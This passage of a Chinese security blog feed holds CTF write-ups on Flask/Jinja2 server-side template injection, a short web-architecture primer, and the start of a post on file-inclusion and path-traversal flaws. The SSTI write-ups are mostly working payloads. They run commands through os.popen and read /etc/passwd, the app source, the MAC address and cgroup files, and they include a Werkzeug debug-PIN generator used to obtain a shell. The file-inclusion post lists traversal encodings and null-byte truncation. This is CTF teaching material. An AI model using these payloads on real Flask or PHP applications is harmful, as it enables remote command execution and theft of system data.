class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">#文件操作</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>其中第一条payload中的[id]可以替换成命令,如ls,cat等,第二条payload的[filename]也可替换成文件名称.  进行命令执行</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180938692.png" alt="image-20230418093835630"></p><p>类似的还有一道</p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>悉的ssti</p><p> 打开网页，在源代码的注释里发现提示用GET传递search参数，又发现这是一个Flask网页，所以可能用到SSTI注入，现在需要搞清楚这个网页是什么模板。按照图示步骤：  </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180939801.png" alt="img"></p><p>确定哪个模板注入的一般流程：</p><ul><li>在疑似注入点的地方输入${7*7},如果有结果为49</li><li>继续输入a{<em>comment</em>}b,成功则是smarty引擎，以此类推</li></ul><p>有些时候不同的<a href="https://so.csdn.net/so/search?q=%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E&spm=1001.2101.3001.7020">模板引擎</a>对同一输入49都有结果</p><p>但是在Twig中结果是49，在jinja2中是7777777。</p><p>将search的值改为49发现网页显示是7777777，所以确定是jinja2模板。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180939528.png" alt="img"></p><p>   <a href="https://www.yuque.com/u32809378/vszzu2/pwdzroqyxc3n7706">https://www.yuque.com/u32809378/vszzu2/pwdzroqyxc3n7706</a></p><p>通过对python的对象继承一步步来实现文件读取和命令执行,思路大抵为：</p><ol><li>寻找父类type:’object’</li><li>寻找子类</li><li>寻找关于命令执行或者文件操作的模块：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">__class__ 返回类所属的对象<br>__mro__ 输出当前对象所调用的全部类包括其父类<br>__base__ 同 __mro__ 用来寻找基类<br>__subclasses__ 输出该类下所有的子类(返回列表)<br>__init__ 类的初始化方法<br>__globals__ 对包含函数全局变量的字典的引用<br></code></pre></td></tr></table></figure><p> 两条pyhon2,python3通用的payload:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#命令执行：</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><span class="hljs-comment">#文件操作</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p> 其中第一条payload中的[id]可以替换成命令,如ls,cat等,第二条payload的[filename]也可替换成文件名称.<br>进行命令执行<br>a. 目录读取</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">PS：由于使用[&#x27;**globals**&#x27;]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[&#x27;**glo&#x27;+&#x27;bals**&#x27;]</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;**import**(&#x27;os&#x27;).popen(&#x27;ls &#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">页面回显：bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">b. 读取目录flasklight</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;**import**(&#x27;os&#x27;).popen(&#x27;ls /flasklight&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">页面回显：app.py coomme_geeeett_youur_flek</span><br><span class="language-xml">c. cat文件 coomme_geeeett_youur_flek 得到flag</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;**import**(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek &#x27;).read()&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;% <span class="hljs-name">for</span> c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__<span class="hljs-string">&#x27;glo&#x27;</span>+<span class="hljs-string">&#x27;bals&#x27;</span>__[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p> 知识点：<a href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>框架开启debug模式产生的漏洞，PIN码的产生过程和文件读取，字符串拼接绕过，倒序绕过过滤。  </p><p> 首先，打开题目，是是一个base64加密和解密的界面  </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945180.png" alt="img"></p><p> 本题目存在SSTI  </p><p>测试49</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942229.png" alt="img"></p><p> 返回no no no ，说明存在</p><p> 可能被过滤了关键字符，但是我们不知道关键字符，所以要读取一下源码app.py（直接用open）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942306.png" alt="img"></p><p>可以使用<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>拼接进行绕过</p><p>import &#x3D; imp + ort         os &#x3D;o+s</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].**class**.**base**.**subclasses**() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.**name**==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.**init**.**globals**[<span class="hljs-string">&#x27;**builtins**&#x27;</span>][<span class="hljs-string">&#x27;**imp&#x27;</span>+<span class="hljs-string">&#x27;ort**&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-string">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942344.png" alt="img"></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/this_is_the_fl&#x27;</span>+<span class="hljs-string">&#x27;ag.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942273.png" alt="img"></p><p>预期解</p><p>文件包含，PIN码生成</p><p>关于PIN码的相关资料请参考：Flask debug 模式 PIN 码生成机制安全性研究笔记</p><p>得到PIN码需要六个信息，其中2和3易知</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">flask所登录的用户名<br>modname，一般是flask.app<br>getattr(app, “name”, app.class.name)。一般为Flask<br>flask库下app.py的绝对路径。这个可以由报错信息看出<br>当前网络的mac地址的十进制数。<br>机器的id。<br></code></pre></td></tr></table></figure><ol><li>flask用户名可以通过读取&#x2F;etc&#x2F;passwd来知道</li></ol><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942536.png" alt="img"></p><ol><li>app.py的绝对路径，可从报错信息得到</li></ol><p>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942148.png" alt="img"></p><p> \3. mac地址的十进制数  </p><p> 首先要得到网卡 <strong>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</strong></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain"> 02:42:ac:10:93:07<br>将：去掉<br>0242ac109307<br>在python中进行转化<br>print(int(&#x27;0242ac109307&#x27;,16))<br>得到<br>2485377864455<br></code></pre></td></tr></table></figure><ol start="4"><li>docker机器的id</li></ol><p><strong>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。</strong></p><p><strong>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，</strong></p> <figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p> 得到docker机器id，也就是**1:name&#x3D;systemd:&#x2F;docker&#x2F;**之后的字符串  </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942356.png" alt="img"></p><p>生成pin码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377864455&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br></code></pre></td></tr></table></figure><p>结果：199-196-476</p><h3 id="传入PIN码，终端RCE"><a href="#传入PIN码，终端RCE" class="headerlink" title="传入PIN码，终端RCE"></a>传入PIN码，终端RCE</h3><p>然后在报错的界面，点击窗口栏，输入PIN</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945927.png" alt="img"></p><p> 输入PIN码  </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945956.png" alt="img"></p><p> 终端shell  </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180944005.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945378.png" alt="img"></p><p>polarctf  flask_pin</p><p>进入题目是一个python的flsak debug环境界面，存在pin码输入的情况。</p>]]></content>
    
    
    <categories>
      
      <category>模板注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web基础篇</title>
    <link href="/2023/04/06/web%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2023/04/06/web%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="web基础篇"><a href="#web基础篇" class="headerlink" title="web基础篇"></a>web基础篇</h1><h4 id="web应用程序一般分为三部分：客户端，服务端，存储端"><a href="#web应用程序一般分为三部分：客户端，服务端，存储端" class="headerlink" title="web应用程序一般分为三部分：客户端，服务端，存储端"></a>web应用程序一般分为三部分：客户端，服务端，存储端</h4><p>客户端：</p><p>EDGE内核：Edge浏览器</p><p>Blink内核：最新的Chrome</p><p>Gecko内核：Firefox浏览器</p><p>WebKit内核：Safar和chrome</p><p>Presto内核：代表是Opera</p><p>服务端：</p><p>作用：从客户端接受请求数据，对请求数据做处理后返回数据给客户端</p><p>Unix和Linux下常用的web服务器有：apache，Nginx，，Tomcat，Lighttpd，BEA Weblogic等</p><p>存储端：</p><p>作用：用来检索和存储数据，常见的为数据库</p><p>大型数据库：Oracle，Sybase，DB2，SQL server</p><p>小型数据库：Access，MySql</p><p>web架构</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304072249758.png" alt="image-20230407224952717"></p><p>组成：</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304072251297.png" alt="image-20230407225152209"></p><h4 id="简单动态网站的工作流程："><a href="#简单动态网站的工作流程：" class="headerlink" title="简单动态网站的工作流程："></a>简单动态网站的工作流程：</h4><p>客户端发送请求–》中间件发送请求–》数据库</p><p>数据库返回数据–&gt;中间件返回数据–》客户端</p><h4 id="后端存储"><a href="#后端存储" class="headerlink" title="后端存储"></a>后端存储</h4><p>后端可以和web服务器放在一起，也可以分开（站库分离）</p><p>数据库存储技术分为：</p><p>1.简单文件存储</p><p>2.关系型数据库 如MySQL ，Oracle，SQL server等</p><p>3.非关系型数据库 redis，mongoDB等</p><p>4.目录数据库</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h1><p>代码注入， 典型代表就是文件包含。<br>原理：注入一段用户可控的代码，让服务端执行<br>常见导致文件包含的函数：<br>php：include（），include_once(),require(),require_once(),fopen(),readfile()…<br>jsp&#x2F;Servlet: ava.io.file(),java.io.fileReader(),…<br>asp: include file,include virtual,…</p><p>include（）<br>include_once()<br>require()<br>,require_once()<br>使用这四个函数包含新文件，不会看包含文件的类型，文件会作为php代码执行。</p><p>利用条件：<br>        （1）.include（）等函数通郭动态变量方式引入<br>（2）.用户能控制动态变量<br>1.1 本地文件包含<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050055034.png" alt="image-20230405005517886"><br> file_exists() 函数检查文件或目录是否存在。<br> &#x2F;&#x2F;file_exists() 函数检查文件或目录是否存在。存在将他包含进来。<br>假如:$file&#x3D;..&#x2F;..&#x2F;etc&#x2F;passwd<br>实际代码：<br>include  ’&#x2F;home&#x2F;wwwrun&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.php‘   etc&#x2F;passwd.php不存在， 利用0字节（\x00，字符串结束符),截断$file后面的字符串<br>$file&#x3D;..&#x2F;..&#x2F;etc&#x2F;passwd\0 —-&gt;URL  $file&#x3D;..&#x2F;..&#x2F;etc&#x2F;passwd%00</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050056794.png" alt="image-20230405005629701"><br><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。<br>**str_replace() **将$value中”\0”替换为’’<br>然而 cloie发现新技巧：利用操作系统对目录最大长度限制，可以不使用0字节截断就可以达到目的，Windows目录字符串长度256字节，linux目录字符串长度4096字节<br>构造.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;abc<br>或&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;abc<br>或..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;<br>除了include（)等四个函数，php中能过对文件进行</p><p>..&#x2F;..&#x2F;..&#x2F; 目录遍历<br>%2e%2e%1f  &#x3D;  ..&#x2F;<br>%2e%2e&#x2F;  &#x3D;  ..&#x2F;<br>%2f&#x3D;&#x2F;<br>%2e&#x3D;.<br>%5e&#x3D;<br>%252e&#x3D;.<br>%252c&#x3D;<br>..%c%af&#x3D;..&#x2F;<br>..%c1%9c&#x3D;..\</p><p>cve-2008-2938 tomcat<strong>目录遍历漏洞</strong><br>context.xml 或server.xml（tomcat配置文件）allowlinking和URIencoding为“UTF-8”攻击者就可以web权限获得重要内容<br><img src="https://cdn.nlark.com/yuque/0/2022/png/34275754/1667876262270-46b869c1-19ef-46cc-94ed-c8e6d5b905ad.png#averageHue=%23ececec&clientId=uc46dca5a-aace-4&from=paste&height=28&id=u8bc5ad09&name=image.png&originHeight=35&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17889&status=done&style=none&taskId=u2912b6db-6cbe-4501-b718-fbb5be1435e&title=&width=520.8" alt="image.png"><br>当配置了open_baedir时，失效<br>（open_baedir)限制特定目录php能打开的文件，与safe_mode是否开启无关<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050056242.png" alt="image-20230405005656159"><br>open_basedir的值是目录前缀<br>若open_basedir&#x3D;   